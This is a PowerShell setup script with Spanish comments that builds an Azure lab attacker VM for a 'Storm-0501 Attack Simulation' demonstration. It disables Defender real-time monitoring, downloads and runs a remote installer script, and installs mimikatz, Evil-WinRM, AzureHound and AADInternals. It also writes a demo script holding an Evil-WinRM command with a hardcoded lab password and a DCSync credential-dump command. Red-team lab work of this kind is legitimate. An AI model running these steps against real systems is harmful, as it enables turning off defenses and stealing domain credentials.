param(
    [string]$ResourceGroup,
    [string]$VMName = "LAB-ATTACKER01"
)

$toolsScript = {
    # Crear directorios
    New-Item -ItemType Directory -Path "C:\tools" -Force
    New-Item -ItemType Directory -Path "C:\temp" -Force
    
    # Deshabilitar Defender temporalmente
    Set-MpPreference -DisableRealtimeMonitoring $true
    
    # Instalar Chocolatey
    Set-ExecutionPolicy Bypass -Scope Process -Force
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
    
    # Instalar herramientas base
    choco install git -y
    choco install vscode -y
    choco install powershell-core -y
    choco install azure-cli -y
    
    # Instalar Ruby para Evil-WinRM
    choco install ruby -y
    gem install evil-winrm
    
    # Descargar herramientas de ataque
    git clone https://github.com/gentilkiwi/mimikatz.git C:\tools\mimikatz
    
    # Descargar AzureHound
    Invoke-WebRequest -Uri "https://github.com/BloodHoundAD/AzureHound/releases/download/v1.2.3/azurehound-windows-amd64.zip" -OutFile "C:\temp\azurehound.zip"
    Expand-Archive -Path "C:\temp\azurehound.zip" -DestinationPath "C:\tools\azurehound"
    
    # Descargar AzCopy
    Invoke-WebRequest -Uri "https://aka.ms/downloadazcopy-v10-windows" -OutFile "C:\temp\azcopy.zip"
    Expand-Archive -Path "C:\temp\azcopy.zip" -DestinationPath "C:\tools\azcopy"
    
    # Instalar módulos PowerShell
    Install-Module -Name Az -Force -AllowClobber
    Install-Module -Name AzureAD -Force
    Install-Module -Name AADInternals -Force
    Install-Module -Name MSOnline -Force
    
    # Agregar al PATH
    $env:PATH += ";C:\tools\azurehound;C:\tools\azcopy\azcopy_windows_amd64_10.21.2"
    [Environment]::SetEnvironmentVariable("PATH", $env:PATH, [EnvironmentVariableTarget]::Machine)
    
    # Crear script de ataque automatizado
    $attackScript = @'
# Storm-0501 Attack Simulation Script
# Ejecutar paso a paso durante la demostración

Write-Host "=== Storm-0501 Attack Simulation ===" -ForegroundColor Red

# Paso 1: Reconocimiento
Write-Host "Fase 1: Reconocimiento" -ForegroundColor Yellow
sc query sense
sc query windefend

# Paso 2: Lateral Movement
Write-Host "Fase 2: Conexión Evil-WinRM" -ForegroundColor Yellow
# evil-winrm -i 192.168.1.10 -u administrator -p StormLab2024!

# Paso 3: DCSync (ejecutar manualmente)
Write-Host "Fase 3: DCSync Attack" -ForegroundColor Yellow
Write-Host "Ejecutar: mimikatz # lsadump::dcsync /user:victim\MSOL_*" -ForegroundColor Cyan

# Paso 4: AzureHound
Write-Host "Fase 4: Azure Enumeration" -ForegroundColor Yellow
Write-Host "Ejecutar: .\azurehound.exe -u [DSA-account] -p [password]" -ForegroundColor Cyan

Write-Host "=== Script preparado para demostración ===" -ForegroundColor Green
'@
    
    $attackScript | Out-File "C:\tools\storm-attack-demo.ps1"
}

Invoke-AzVMRunCommand `
    -ResourceGroupName $ResourceGroup `
    -VMName $VMName `
    -CommandId 'RunPowerShellScript' `
    -ScriptBlock $toolsScript
